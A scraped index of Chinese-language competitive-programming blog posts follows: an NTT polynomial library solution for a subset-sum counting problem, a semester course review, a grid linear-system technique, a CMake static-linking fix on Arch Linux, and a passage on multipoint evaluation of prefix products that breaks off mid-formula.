57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 // An AC a day keeps the doctor away. #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; #define all(x) begin(x), end(x) #ifdef CKISEKI #include \u0026lt;experimental/iterator\u0026gt; #define safe cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; #define debug(a...) debug_(#a, a) #define orange(a...) orange_(#a, a) void debug_(auto s, auto ...a) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;; int f = 0; (..., (cerr \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; a)); cerr \u0026lt;\u0026lt; \u0026#34;)\\e[0m\\n\u0026#34;; } void orange_(auto s, auto L, auto R) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;33m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] = [ \u0026#34;; using namespace experimental; copy(L, R, make_ostream_joiner(cerr, \u0026#34;, \u0026#34;)); cerr \u0026lt;\u0026lt; \u0026#34; ]\\e[0m\\n\u0026#34;; } #else #define safe ((void)0) #define debug(...) safe #define orange(...) safe #endif const int mod = 998244353; int add(int a, int b) { return a + b \u0026gt;= mod ? a + b - mod : a + b; } int sub(int a, int b) { return a - b \u0026lt; 0 ? a - b + mod : a - b; } int mul(int64_t a, int64_t b) { return static_cast\u0026lt;int\u0026gt;(a * b % mod); } int modpow(int e, int p) { int r = 1; while (p) { if (p \u0026amp; 1) r = mul(r, e); e = mul(e, e); p \u0026gt;\u0026gt;= 1; } return r; } int modinv(int x) { return modpow(x, mod - 2); } template \u0026lt;int mod, int G, int maxn\u0026gt; struct NTT { static_assert (maxn == (maxn \u0026amp; -maxn)); int roots[maxn]; NTT () { int r = modpow(G, (mod - 1) / maxn); for (int i = maxn \u0026gt;\u0026gt; 1; i; i \u0026gt;\u0026gt;= 1) { roots[i] = 1; for (int j = 1; j \u0026lt; i; j++) roots[i + j] = mul(roots[i + j - 1], r); r = mul(r, r); // for (int j = 0; j \u0026lt; i; j++) // FFT (tested) // roots[i+j] = polar\u0026lt;llf\u0026gt;(1, PI * j / i); } } // n must be 2^k, and 0 \u0026lt;= F[i] \u0026lt; mod template \u0026lt;typename T\u0026gt; void operator()(int F[], T n, bool inv = false) { for (T i = 0, j = 0; i \u0026lt; n; i++) { if (i \u0026lt; j) swap(F[i], F[j]); for (T k = n\u0026gt;\u0026gt;1; (j^=k) \u0026lt; k; k\u0026gt;\u0026gt;=1); } for (T s = 1; s \u0026lt; n; s *= 2) { for (T i = 0; i \u0026lt; n; i += s * 2) { for (T j = 0; j \u0026lt; s; j++) { int a = F[i+j], b = mul(F[i+j+s], roots[s+j]); F[i+j] = add(a, b); // a + b F[i+j+s] = sub(a, b); // a - b } } } if (inv) { int iv = modinv(int(n)); for (T i = 0; i \u0026lt; n; i++) F[i] = mul(F[i], iv); reverse(F + 1, F + n); } } }; using lld = int64_t; int modpow(lld e, int p, int m) { lld r = 1; while (p) { if (p \u0026amp; 1) r = r * e % m; e = e * e % m; p \u0026gt;\u0026gt;= 1; } return (int)r; } int get_root(int n, int P = mod) { // ensure 0 \u0026lt;= n \u0026lt; p if (P == 2 or n == 0) return n; auto check = [\u0026amp;](lld x) { return modpow(int(x), (P - 1) / 2, P); }; if (check(n) != 1) return -1; mt19937 rnd(7122); lld z = 1, w; while (check(w = (z * z - n + P) % P) != P - 1) z = rnd() % P; const auto M = [P, w](auto \u0026amp;u, auto \u0026amp;v) { auto [a, b] = u; auto [c, d] = v; return make_pair((a * c + b * d % P * w) % P, (a * d + b * c) % P); }; pair\u0026lt;lld, lld\u0026gt; r(1, 0), e(z, 1); for (int q = (P + 1) / 2; q; q \u0026gt;\u0026gt;= 1, e = M(e, e)) if (q \u0026amp; 1) r = M(r, e); return int(r.first); // sqrt(n) mod P where P is prime } NTT\u0026lt;mod, 3, (1\u0026lt;\u0026lt;20)\u0026gt; ntt; #define fi(l, r) for (size_t i = (l); i \u0026lt; (r); i++) using S = vector\u0026lt;int\u0026gt;; auto Mul(auto a, auto b, size_t sz) { a.resize(sz), b.resize(sz); ntt(a.data(), sz); ntt(b.data(), sz); fi(0, sz) a[i] = mul(a[i], b[i]); return ntt(a.data(), sz, true), a; } S Newton(const S \u0026amp;v, int init, auto \u0026amp;\u0026amp;iter) { S Q = { init }; for (int sz = 2; Q.size() \u0026lt; v.size(); sz *= 2) { S A{begin(v), begin(v) + min(sz, int(v.size()))}; A.resize(sz * 2), Q.resize(sz * 2); iter(Q, A, sz * 2); Q.resize(sz); } return Q.resize(v.size()), Q; } S Inv(const S \u0026amp;v) { // v[0] != 0 return Newton(v, modinv(v[0]), [](S \u0026amp;X, S \u0026amp;A, int sz) { ntt(X.data(), sz), ntt(A.data(), sz); for (int i = 0; i \u0026lt; sz; i++) X[i] = mul(X[i], sub(2, mul(X[i], A[i]))); ntt(X.data(), sz, true); }); } S Dx(S A) { fi(1, A.size()) A[i - 1] = mul(i, A[i]); return A.empty() ? A : (A.pop_back(), A); } S Sx(S A) { A.insert(A.begin(), 0); fi(1, A.size()) A[i] = mul(modinv(int(i)), A[i]); return A; } S Ln(const S \u0026amp;A) { // coef[0] == 1; res[0] == 0 auto B = Sx(Mul(Dx(A), Inv(A), bit_ceil(A.size()*2))); return B.resize(A.size()), B; } S Exp(const S \u0026amp;v) { // coef[0] == 0; res[0] == 1 return Newton(v, 1, [](S \u0026amp;X, S \u0026amp;A, int sz) { auto Y = X; Y.resize(sz / 2); Y = Ln(Y); fi(0, Y.size()) Y[i] = sub(A[i], Y[i]); Y[0] = add(Y[0], 1); X = Mul(X, Y, sz); }); } S Pow(S a, lld M) { // period mod*(mod-1) assert(!a.empty() \u0026amp;\u0026amp; a[0] != 0); const auto imul = [\u0026amp;a](int s) { for (int \u0026amp;x: a) x = mul(x, s); }; int c = a[0]; imul(modinv(c)); a = Ln(a); imul(int(M % mod)); a = Exp(a); imul(modpow(c, int(M % (mod - 1)))); return a; // mod x^N where N=a.size() } S Sqrt(const S \u0026amp;v) { // need: QuadraticResidue assert(!v.empty() \u0026amp;\u0026amp; v[0] != 0); const int r = get_root(v[0]); assert(r != -1); return Newton(v, r, [](S \u0026amp;X, S \u0026amp;A, int sz) { auto Y = X; Y.resize(sz / 2); auto B = Mul(A, Inv(Y), sz); for (int i = 0, inv2 = mod / 2 + 1; i \u0026lt; sz; i++) X[i] = mul(inv2, add(X[i], B[i])); }); } S Mul(auto \u0026amp;\u0026amp;a, auto \u0026amp;\u0026amp;b) { const auto n = a.size() + b.size() - 1; auto R = Mul(a, b, bit_ceil(n)); return R.resize(n), R; } S MulT(S a, S b, size_t k) { assert(b.size()); reverse(all(b)); auto R = Mul(a, b); R = vector(R.begin() + b.size() - 1, R.end()); return R.resize(k), R; } S Eval(const S \u0026amp;f, const S \u0026amp;x) { if (f.empty()) return vector(x.size(), 0); const int n = int(max(x.size(), f.size())); auto q = vector(n * 2, S(2, 1)); S ans(n); fi(0, x.size()) q[i + n][1] = sub(0, x[i]); for (int i = n - 1; i \u0026gt; 0; i--) q[i] = Mul(q[i \u0026lt;\u0026lt; 1], q[i \u0026lt;\u0026lt; 1 | 1]); q[1] = MulT(f, Inv(q[1]), n); for (int i = 1; i \u0026lt; n; i++) { auto L = q[i \u0026lt;\u0026lt; 1], R = q[i \u0026lt;\u0026lt; 1 | 1]; q[i \u0026lt;\u0026lt; 1 | 0] = MulT(q[i], R, L.size()); q[i \u0026lt;\u0026lt; 1 | 1] = MulT(q[i], L, R.size()); } for (int i = 0; i \u0026lt; n; i++) ans[i] = q[i + n][0]; return ans.resize(x.size()), ans; } pair\u0026lt;S, S\u0026gt; DivMod(const S \u0026amp;A, const S \u0026amp;B) { assert(!B.empty() \u0026amp;\u0026amp; B.back() != 0); if (A.size() \u0026lt; B.size()) return {{}, A}; const auto sz = A.size() - B.size() + 1; S X = B; reverse(all(X)); X.resize(sz); S Y = A; reverse(all(Y)); Y.resize(sz); S Q = Mul(Inv(X), Y); Q.resize(sz); reverse(all(Q)); X = Mul(Q, B); Y = A; fi(0, Y.size()) Y[i] = sub(Y[i], X[i]); while (Y.size() \u0026amp;\u0026amp; Y.back() == 0) Y.pop_back(); while (Q.size() \u0026amp;\u0026amp; Q.back() == 0) Q.pop_back(); return {Q, Y}; } // empty means zero polynomial int LinearRecursionKth(S a, S c, int64_t k) { const auto d = a.size(); assert(c.size() == d + 1); const auto sz = bit_ceil(2 * d + 1), o = sz / 2; S q = c; for (int \u0026amp;x: q) x = sub(0, x); q[0]=1; S p = Mul(a, q); p.resize(sz); q.resize(sz); for (int r; r = (k \u0026amp; 1), k; k \u0026gt;\u0026gt;= 1) { fill(d + all(p), 0); fill(d + 1 + all(q), 0); ntt(p.data(), sz); ntt(q.data(), sz); for (size_t i = 0; i \u0026lt; sz; i++) p[i] = mul(p[i], q[(i + o) \u0026amp; (sz - 1)]); for (size_t i = 0, j = o; j \u0026lt; sz; i++, j++) q[i] = q[j] = mul(q[i], q[j]); ntt(p.data(), sz, true); ntt(q.data(), sz, true); for (size_t i = 0; i \u0026lt; d; i++) p[i] = p[i \u0026lt;\u0026lt; 1 | r]; for (size_t i = 0; i \u0026lt;= d; i++) q[i] = q[i \u0026lt;\u0026lt; 1]; } // Bostan-Mori return mul(p[0], modinv(q[0])); } // a_n = \\sum c_j a_(n-j), c_0 is not used signed main() { ios_base::sync_with_stdio(false); cin.tie(nullptr); int N, T; cin \u0026gt;\u0026gt; N \u0026gt;\u0026gt; T; vector\u0026lt;int\u0026gt; cnt(T + 1); for (int i = 0; i \u0026lt; N; i++) { int x; cin \u0026gt;\u0026gt; x; cnt[x] += 1; } vector\u0026lt;int\u0026gt; inv(T + 1); inv[1] = 1; for (int i = 2; i \u0026lt;= T; i++) inv[i] = mul(inv[mod % i], mod - mod / i); vector\u0026lt;int\u0026gt; a(T + 1); for (int i = 1; i \u0026lt;= T; i++) { for (int j = 1; i * j \u0026lt;= T; j++) { if (j \u0026amp; 1) a[i * j] = add(a[i * j], mul(cnt[i], inv[j])); else a[i * j] = sub(a[i * j], mul(cnt[i], inv[j])); } } a = Exp(a); for (int i = 1; i \u0026lt;= T; i++) cout \u0026lt;\u0026lt; a[i] \u0026lt;\u0026lt; (i+1==N ? \u0026#39;\\n\u0026#39; : \u0026#39; \u0026#39;); } ","permalink":"https://omeletwithoutegg.github.io/2025/02/27/sharp-p-subset-sum/","tags":["tutorial","FFT","math","adhoc","template"],"title":"♯p Subset Sum"},{"contents":"Seventh semester 因為第六學期的最後感覺太捲了，於是這學期就決定躺平。本來有想要修密碼學的理論基礎，但他還要分組報告報論文，然後課上沒一個認識的，就逃走了。課表於是看起來非常羞恥。\n日文二上 因為必須要修一門外文才能畢業，學期初跑去加簽日文一。跑了好幾個班（平均一班的中獎機率是四十人裡面十人）抽中加簽之後，畢竟我高中也有修過日文，從零開始上課實在也有點枯燥，剛好老師又說到如果我們都會了那不要浪費彼此的時間。於是跟系辦問過可以直接把日文二上下當作畢業的這門學分，再加上寄信給老師確定可以加簽，就跑去日文二上了。雖然課程網上寫擋修，但日文二上下非常的不擁擠，教室也坐不滿，只要確定自己可以而且老師同意（彭誼芝老師看起來很乾脆的同意了）看起來就直接可以修了。\n教材看起來是所有班都統一的 來學日本語，日文二上下會用到初級一初級二（藍色跟綠色），這學期的進度是把藍色那本後半的大約八個章節。課本在總圖旁邊的出版中心就有賣了，印象中一本是兩百五，如果有好好修滿日文一到三可以用三年其實很便宜（？）我們老師第一次上課就會用到了所以最好早早準備。\n然後雖然我講了這麼多，但從教材也可以發現我們的課程目標似乎是考過 N4，而我在這學期也藉著修日文乾脆去試著考了十二月的 N3，考了個意外好的 174/180，不枉費我天天刷 QuizKnock 的影片。不過 JLPT 的試驗內容只有聽跟讀，在課堂上要練習寫和說，寫意外的好難（假名好難寫\u0026hellip;漢字好容易搞混\u0026hellip;），再加上我應該也最好在課堂上系統性地聽一些文法（才不會全靠感覺），應該是一個我繼續待在二的好理由。\n大學國文：文學鑑賞與寫作（一） （誰大四還在修國文）學期初選了幾個國文，不像日文太熱門沒有大四之力，國文就直接上了。\n我們這班的老師是沈凡玉老師，不知道是他的教課口才比較好還是我跟老師的頻率（顏色？）相近，對老師的印象還不錯。課程主題在文言的部份從漢樂府、古詩十九首、魏晉詩歌裡面選了一些文本。老師上課的方法是精讀（他自己講的），每首詩除了字面的解釋以外還會細講創作的時空背景、創作裡面代表的當時的文化，以及文人在詩裡面用典故時會講解典故。典故的部份，我覺得把他對應到現代就像是在聊天的時候喜歡引用時事或是網路梗，不解釋任何上下文，覺得簡直就是古代謎語人很有趣。基本上我是把他當每個禮拜去聽故事（雖然我也有作筆記）。考試是考論證題，要拿分應該就是要把上課講的那些短短的詩對應的龐大上下文記下來，而要高分的話可能就是要發揮創意跟文筆，找到某些支持你的論點的證據（要有讀書才有材料\u0026hellip;），發現其他人不太會發現的點之類的。不太知道自己寫得怎麼樣但盡力了。\n寫作的部份只有三份作業。第一份是「台大三週 / X 年」寫一個回顧的散文。第二篇是看電影之後，選一個有關的問題，針對那個問題進行類似辯論的正反論述，寫一篇論說文。我們看的電影是 Die welle / 浪潮，他的敘事感覺亂七八糟，不過有一整堂國文課可以看電影還是不錯的。挑的問題好像非常不受限，重點是論說文要符合他敘述的格式跟方法，還有文章本身要有說服力，問題跟電影的相關性反而不那麼重要。最後一份作業是上課寫應用書信。基本上也是照著一個規定的框架寫，需要正確使用那些禮貌用語，可以虛構情節。總結來說是我覺得不算太辛苦也不會不舒服的作業。\n雖然最後拿了個 A 但國文好像就是這樣，聽說還有限制百分比是只有 5% 還 10% 可以 A+。論推不推的話是推。\n專題研究 tmt514：卡恩回來教課。久仰大名於是我跟著跑去他的實驗室修專題研究（系訂必修）\n這學期感覺相當草創（？）我報了一篇動態連通性資料結構的 paper，然後還有每週聽別人報的演算法 paper，聽到很多很多 log（？）的演算法跟很多隨機方法。整學期大概就是報 paper 跟聽 paper。但我還是覺得沒有感受到什麼方向生出一些感覺有學術意義的東西。\n程式結構與設計 ICPC 培訓班。感覺很多辛苦的事情都是波路在做的，有點心虛。不過至少成功把舊 ntujudge 的題目給搬遷到 TIOJ 上了。\n結 回顧了一下，這學期前的暑假首先是 FLOLAC，然後結束之後差不多八月下半把之前玩到一半的 FF7 remake 給玩完。好像一直都處於非常懶惰的狀態。但我覺得如果修一大堆課或是接一大堆工作把自己搞很累，大概很難提筆寫這個部落格，或是做一些有趣的自己想寫的 code？\n這學期 GPA 4.14。但老實說不交換也不讀研的話 GPA 沒什麼用。越寫怎麼越覺得空虛了。\n學期末的時候大約是推甄放榜的時候。大家都有去填推甄，但我覺得我應該不會去於是便抱著不要佔名額的心態沒去處理，但看起來很多人即使不太打算要去還是會先推一推當備案之類的，總覺得這樣哪裡怪怪的，但確實這樣可能才算負責任跟會風險管理，應該還是自己太幼稚。\n","permalink":"https://omeletwithoutegg.github.io/2025/02/13/csie-7th-sem/","tags":["CSIE","experience"],"title":"第七學期修課心得"},{"contents":"關鍵變數法 Description 上個例題 https://codeforces.com/problemset/problem/963/E\n有一個人在二維網格圖上隨機上下左右走，一開始在原點 $(0, 0)$，每秒有 $p_1, p_2, p_3, p_4$ 的機率分別往上下左右走一格，問期望幾秒會走到跟原點距離超過 $r$ 的點？答案模 $10^9+7$。$p_i = a_i/\\sum a_i$ 而 $1 \\leq a_i \\leq 1000$。\nSolution 令 $f(i, j)$ 代表期望走幾步會停下來，則邊界的 $f(i, j) = 0$，而對於內部的 $f(i, j)$ 則有\n$$\nf(i, j) = 1 + p_1 f(i - 1, j) + p_2 f(i + 1, j) + p_3 f(i, j - 1) + p_4 f(i, j + 1)\n$$\n因為變數之間依賴的關係有環所以不能簡單的用 DP 求解。高斯消去要花 $\\mathcal{O}(n^3)$ 的時間求解，其中 $n$ 是變數數量，也就是大約 $\\pi r^3$ 個，所以總共是 $\\mathcal{O}(r^6)$。官解是利用類似 band matrix 的性質做到 $\\mathcal{O}(r^4)$。\n但其實可以做更好！圓內部的格子點共有 $\\mathcal{O}(r)$ 個橫排，我們令每個橫排最左邊的變數是關鍵變數 $x_1, x_2, \\dots, x_k$，則每個變數都可以表示成關鍵變數的線性組合，方法是利用以下等式\n$$\nf(i, j + 1) = \\frac{1}{p_4} \\left( f(i, j) - 1 - p_1 f(i - 1, j) + p_2 f(i + 1, j) + p_3 f(i, j - 1) \\right)\n$$\n等式右邊每個 $f$ 都是 $k$ 個關鍵變數的某個線性組合，因此推出來的等式左邊也是 $k$ 個關鍵變數的線性組合。可以自然的從左往右推出每個位置，每個位置會花 $\\mathcal{O}(r)$ 計算，而位置的數量是 $\\mathcal{O}(r^2)$，總共只要花 $\\mathcal{O}(r^3)$ 就可以計算出每個位置怎麼用關鍵變數表示。一路推到右邊的邊界之後就會得到 $\\mathcal{O}(r)$ 個等式，這樣我們就只要求解一個長跟寬都是 $\\mathcal{O}(r)$ 的矩陣了。直接高斯消去就是 $\\mathcal{O}(r^3)$。\nGeneralization IOIC 某天某一題也是這種在二維網格圖上 markov chain 的題（不過不是上下左右動而是在類似三角形的 lattice 上動？$\\mathbb{Z}[e^{\\frac{2\\pi i}{3}}]$ 之類的？），官解一樣給的是 band matrix 的解法。一樣可以令三角形內部最靠邊界的一排當作關鍵變數，就可以在 $\\mathcal{O}(r^3)$ 求解了，其中 $r$ 是三角形邊長。\n這個方法意外的很難推廣？若網格當中存在障礙物或是有邊權為 $0$ 的情況，我們就沒辦法往右推出那個變數，需要把那個變數當作新的關鍵變數。\n去查了一下還能不能做更好，查到 refernce 那兩篇（一篇又是 tarjan）。\n對於（允許障礙物、邊權為 0 的）網格圖可以用 nested disection 花 $\\mathcal{O}(N^{3/2})$ 得到一個只有 $\\mathcal{O}(N\\log N)$ 個非零元素的矩陣分解，其中 $N$ 是總變數數量；而 tarjan 又加強這個結果到任何有好的 separator 的圖，在任何一般的平面圖上因為有 Planar separator theorem 應該可以做得跟上述複雜度一樣好。反正查一查應該沒有查到本文中寫的方法，本文中應該只是一個足夠簡單到可以在競程比賽當中推出來的一個 trick 而已。\nReference https://www.cnblogs.com/p-b-p-b/p/10849869.html\n此文中稱為主元法，但用主元法當關鍵字真的很難找到資料。 https://epubs.siam.org/doi/10.1137/0710032 https://epubs.siam.org/doi/10.1137/0716027 ","permalink":"https://omeletwithoutegg.github.io/2025/02/01/grid-linear-system/","tags":["linear-algebra","matrix"],"title":"求解二維網格圖上的線性方程組：關鍵變數法"},{"contents":"在 Archlinux 踩到的 CMake 坑 Description 最近在修改 TIOJ，但一直沒辦法 native 的在 archlinux 上編譯 tioj-judge，只能用 docker 跑 ubuntu。於是今天就跳進這個坑裡研究為什麼。\n節錄部份錯誤訊息\n-- The C compiler identification is GNU 14.2.1 -- Detecting C compiler ABI info -- Detecting C compiler ABI info - done -- Check for working C compiler: /usr/bin/cc - skipped -- Detecting C compile features -- Detecting C compile features - done Build Type: Release -- Found PkgConfig: /usr/bin/pkg-config (found version \u0026#34;2.3.0\u0026#34;) -- Checking for module \u0026#39;libseccomp\u0026#39; -- Found libseccomp, version 2.5.5 CMake Error at /usr/share/cmake/Modules/FindPackageHandleStandardArgs.cmake:233 (message): Could NOT find libseccomp (missing: LIBSECCOMP_LIBRARIES) (found version \u0026#34;2.5.5\u0026#34;) Call Stack (most recent call first): /usr/share/cmake/Modules/FindPackageHandleStandardArgs.cmake:603 (_FPHSA_FAILURE_MESSAGE) build/_deps/cjail-src/cmake/Findlibseccomp.cmake:57 (find_package_handle_standard_args) build/_deps/cjail-src/CMakeLists.txt:19 (find_package) 也就是說，他在抱怨 find_library 找不到 libseccomp 這個 library。但是我已經 sudo pacman -S libseccomp 了，而且 /usr/lib/libseccomp.so 也好好的存在。\npkg-config 用到的 /usr/lib/pkgconfig/libseccomp.pc 在 archlinux 和 ubuntu 上都是正常存在的，也正確的指向 /usr/lib/（在 ubuntu 24.04 上是 /usr/lib/x86_64-linux-gnu/）。\n接著我跑去看 call stack 裡面的每個檔案用 message(VAR=${VAR}) 印出來那些 variable，得知 pkg-config 的部份應該是有正確的把那些 path 傳給 find_library。\nSolution 真的浪費了我好久去 debug，錯誤訊息非常不清楚。最後找到問題的方法是在 cmake 參數加上 -DCMAKE_FIND_DEBUG_MODE=ON，然後我才發現那段 find_library 只搜尋 .a 檔案，也就是 static library。這是因為 TIOJ 有一個部份強制寫成靜態編譯，如下節錄所示。\n1 2 3 # force build with static because sandbox-exec set(BUILD_SHARED_LIBS OFF) set(CMAKE_FIND_LIBRARY_SUFFIXES \u0026#34;.a\u0026#34;) 1 2 3 4 5 6 7 # sandbox exec # static link it to minimize memory usage; this will lead to some warnings about libc, but it is okay add_executable(sandbox-exec \u0026#34;src/tioj/sandbox_main.cpp\u0026#34; \u0026#34;src/tioj/sandbox.cpp\u0026#34; \u0026#34;src/tioj/sandbox.h\u0026#34;) target_link_libraries(sandbox-exec CJail::libcjail) target_compile_options(sandbox-exec PUBLIC -Os -static) # note that later flags will override previous ones target_link_options(sandbox-exec PUBLIC -static -pthread -Wl,--gc-sections) install(TARGETS sandbox-exec DESTINATION \u0026#34;${TIOJ_DATA_DIR}/\u0026#34;) Archlinux 的官方 repository 甚至於 AUR 一般來說都不提供靜態函式庫。這裡是一些我找到的相關資料。\nhttps://bbs.archlinux.org/viewtopic.php?id=96228 https://bbs.archlinux.org/viewtopic.php?id=217335 https://bbs.archlinux.org/viewtopic.php?id=223376 Conclusion 所以這就是為什麼 cmake 失敗。最好的辦法應該是把 CMakeLists.txt 裡面取消靜態編譯。開發環境的不一致還真是麻煩，docker 真的拯救世界。\n","permalink":"https://omeletwithoutegg.github.io/2025/01/19/tioj-cmake-archlinux/","tags":["experience"],"title":"cmake: Could NOT find libxxx on Archlinux"},{"contents":"一次式前綴積的多點求值與推廣 Description 給定序列 $a_1, \\dots, a_N$。考慮一次式的序列 $x - a_i$，定義其第 $i$ 個前綴積為\n$$\nf_i(x) = \\prod _ {j \\leq i} (x - a_j)\n$$\n接著有 $Q$ 個詢問 $(u_i, v_i)$ 要你回答第 $u_i$ 個前綴積以 $x = v_i$ 代入所得到的值，即 $f_{u_i}(v_i)$。\nSolution naive 可以做到 $\\mathcal{O}(NQ)$。以下介紹一個 $\\mathcal{O}((N+Q)\\log^2(N+Q))$ 的離線作法。\n先問一個問題：我們要怎麼快速的求出 $f_N(x)$ 這個多項式呢？如果用 $f_i(x) = f_{i-1}(x) \\cdot (x - a_i)$ 每次直接 $\\mathcal{O}(N)$ 乘的話，總共會花上 $\\mathcal{O}(N^2)$ 的時間。然而，我們可以建出一棵平衡的二元樹，樹的葉子是這些一次式，如果按照由下到上的順序計算每個節點的小孩的乘積，並使用 FFT 等比較快的多項式乘法的話，總時間就會是 $\\mathcal{O}(N\\log^2N)$。這是因為使用 FFT 把兩個多項式 $f, g$ 相乘會需要 $\\mathcal{O}(k\\log k)$ 的時間，其中 $k=\\deg (fg)$；而在這棵二元樹中每個節點所存的多項式 degree 會等於該節點的子樹裡面的葉子數量，所有節點的多項式 degree 總和又更進一步的等於每個葉子的深度和（可以想想為什麼），因此只要二元樹夠平衡，深度是 $\\mathcal{O}(\\log N)$ 的話，總共乘法所需的時間就會是 $\\mathcal{O}(N\\log ^2N)$。\n接著我們來想辦法解決原本的問題。注意到 $f_{u_i}(v) = f_{u_i}(x) \\mod (x - v)$，把 $v$ 代進去這個動作相當於 mod 一個一次式。\n我們把有關 $u_i$ 的詢問插入到第 $u_i$ 個一次式之後，得到一個長度 $N+Q$ 的序列 $s$，裡面包含了一些一次式和詢問。\n考慮兩個長度 $N+Q$ 的多項式的序列 $A_1, A_2, \\dots, A_{N+Q}$ 和 $B_1, B_2, \\dots, B_{N+Q}$。其中，如果 $s_i$ 是原本的一次式的話，$A_i$ 就設定為該一次式，而 $B_i$ 則為 $1$；而若 $s_i$ 是一個詢問 $(u, v)$，則把 $A_i$ 設為 $1$ 而 $B_i$ 設為 $x - v$。那麼我們最後就是想要對所有 $i$ 知道 $A_1 A_2 \\cdots A_{i-1} \\mod B_i$ 是多少，不妨令這個值叫 $C_i$。\n令 $A_{l, r} = A_l A_{l+1}\\cdots A_r$。令 $B_{l, r} = B_l B_{l+1} \\cdots B_r$。令 $C_{l, r} = A_1 A_2 \\dots A_{l-1} \\mod (B_l B_{l+1} \\cdots B_r)$。在第一段提到的二元樹上每個節點對應的 $A_{l, r}$ 和 $B_{l, r}$ 都可以直接由下往上快速算出來。並且我們可以列出 $C_{l, r}$ 由上往下的遞推式：\n$$\n\\begin{aligned}\nC_{l, m} \u0026amp;= C_{l, r} \\mod B_{l, m} \\\\\nC_{m+1, r} \u0026amp;= C_{l, r} \\cdot A_{l, m} \\mod B_{m+1, r} \\\\\n\\end{aligned}\n$$\n最後 $C_i = C_{i,i}$，葉子的 $C_{l, r}$ 就是所求的答案。因為每個節點的 $A_{l, r}, B_{l, r}, C_{l, r}$ 的 degree 都是被區間長度給 bound 住的，所以時間複雜度與第一段提到的類似都是兩個 log，但因為葉子數量不是 $N$ 而是 $N+Q$，直接代進去是 $\\mathcal{O}((N+Q)\\log ^2 (N+Q))$。\n這裡我們也需要用到「多項式除法可以做很快」這個性質，具體來說是跟多項式乘法一樣，兩個 degree 大約是 $k$ 的多項式除法可以做到 $\\mathcal{O}(k\\log k)$。通常來說 ICPC 的 codebook 都應該要有這個操作。\n註：有人會覺得求出 $f_N(x)$ 要用 huffman tree 當作這個平衡的二元樹，但其實這邊我指的平衡二元樹會是簡單每次將葉子序列切兩半得到的跟線段樹一樣的結構，這樣在 DFS 中序當中葉子序列才會是原本的完整順序。\nExamples Many Factorials https://judge.yosupo.jp/problem/many_factorials\n有 $Q$ 個詢問 $n_i$，每次要你回答 $n_i! \\mod 998244353$ 的值。$Q \\leq 10^5, n_i \u0026lt; 998244353$\n令 $M = 998244353, B \\approx \\sqrt{M}$。\n主要可以分成對於 $i=1,2,\\dots,\\lfloor \\frac{M}{B} \\rfloor$ 求 $(iB)!$，以及對於詢問的 $n$ 求 $n \\cdot (n-1) \\cdots \\cdot (\\lfloor n/B \\rfloor B+1)$ 兩部份。\n前者相當於要算出 $(1 \\cdot 2 \\cdots (B-1) \\cdot B)$、$(B+1 \\cdots 2B)$ 等等，這等價於計算多項式 $x(x+1)(x+2)\\dots (x+B-1)$ 在 $x=1, B+1, \\dots$ 的值。可以花總共 $B\\log ^2 B$ 左右的時間算出來之後，前綴積就得到 $(iB)!$ 了。\n後者可以 reduce 到本次介紹的問題。$a_i = 0, 1, \\dots, B-1$，而一個 $n = B \\cdot \\lfloor n/B \\rfloor + (n\\mod B)$ 則是對應到詢問 $(n\\mod B, n)$，花費 $\\mathcal{O}((B+Q)\\log^2(B+Q))$ 的時間。\n總共花費 $\\mathcal{O}((B+Q)\\log^2(B+Q))$ 的時間。\n順便補充一個小知識就是 $s_n(x) = x(x-1)\\dots (x-(n-1))$ 這個多項式（的各次項係數）可以在 $\\mathcal{O}(n\\log n)$ 時間求得，方法是利用分治以及 Polynomial Taylor Shift，在分治時只需要往一邊的分支跑（也可以想成快速冪）。\nMany Sum of Binomial Coefficients 有 $Q$ 個詢問 $n_i, m_i$，每次要你回答 $\\binom{n_i}{0} + \\binom{n_i}{1} + \\cdots + \\binom{n_i}{m_i} \\mod 998244353$ 的值。$Q, n_i, m_i \\leq 10^5$\n在本來的 setting 中 $A_i$ 都是不高於一次的多項式，而本題則推廣 $\\mathbf{A}_i$ 是一個多項式矩陣。\n令 $v_m = \\begin{bmatrix}\n\\binom{x}{m} \\\\ \\sum _ {i\\le m} \\binom{x}{i}\n\\end{bmatrix}$。則，\n$$\nv_m = \\begin{bmatrix}\n\\binom{x}{m} \\\\ \\sum _ {i\\le m} \\binom{x}{i}\n\\end{bmatrix}\n= \\begin{bmatrix}\n\\frac{x+m-1}{m} \u0026amp; 0 \\\\\n\\frac{x+m-1}{m} \u0026amp; 1\n\\end{bmatrix}\n\\begin{bmatrix}\n\\binom{x}{m-1} \\\\ \\sum _ {i\\le m-1} \\binom{x}{i}\n\\end{bmatrix}\n= \\begin{bmatrix}\n\\frac{x+m-1}{m} \u0026amp; 0 \\\\\n\\frac{x+m-1}{m} \u0026amp; 1\n\\end{bmatrix}\nv_{m-1}\n$$\n不妨就令\n$$\n\\mathbf{A}_i =\n\\begin{bmatrix}\n\\frac{x-i+1}{i} \u0026amp; 0 \\\\\n\\frac{x-i+1}{i} \u0026amp; 1\n\\end{bmatrix}\n$$\n則 $v_m = \\mathbf{A} _ m \\mathbf{A} _ {m-1} \\cdots \\mathbf{A} _ 1 v _ 